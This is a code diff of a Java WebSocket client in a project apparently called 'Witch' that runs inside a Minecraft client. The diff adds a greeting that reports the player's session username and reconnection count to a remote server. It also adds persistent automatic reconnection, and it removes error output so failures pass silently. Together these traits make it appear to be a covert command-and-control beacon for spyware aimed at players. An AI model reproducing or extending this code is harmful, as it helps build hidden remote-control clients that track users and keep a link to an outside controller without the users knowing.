@@ -6,9 +6,11 @@ import org.java_websocket.handshake.ServerHandshake;
 
 import java.net.URI;
 
-public class WSClient extends WebSocketClient {
+import static me.soda.witch.Witch.mc;
 
-    public WSClient c;
+public class WSClient extends WebSocketClient {
+    public static int reconnections = 0;
+    private static boolean reconnect = true;
 
     public WSClient(URI serverURI) {
         super(serverURI);
@@ -17,6 +19,8 @@ public class WSClient extends WebSocketClient {
     @Override
     public void onOpen(ServerHandshake handshakeData) {
         System.out.println("Connection initialized");
+        String greetingMsg = "Reconnected " + reconnections + " times, I am " + mc.getSession().getUsername();
+        MessageUtils.sendMessage("greeting", greetingMsg);
     }
 
     @Override
@@ -26,12 +30,21 @@ public class WSClient extends WebSocketClient {
 
     @Override
     public void onClose(int code, String reason, boolean remote) {
-        Witch.tryReconnect(this::reconnect);
+        if (reconnect) {
+            Witch.tryReconnect(this::reconnect);
+            reconnections++;
+        } else {
+            MessageUtils.sendMessage("bye", "goodbye");
+            System.out.println("Witch end because of manual shutdown");
+        }
     }
 
     @Override
     public void onError(Exception e) {
-        e.printStackTrace();
     }
 
+    public void close(boolean rec) {
+        reconnect = rec;
+        this.close();
+    }
 }
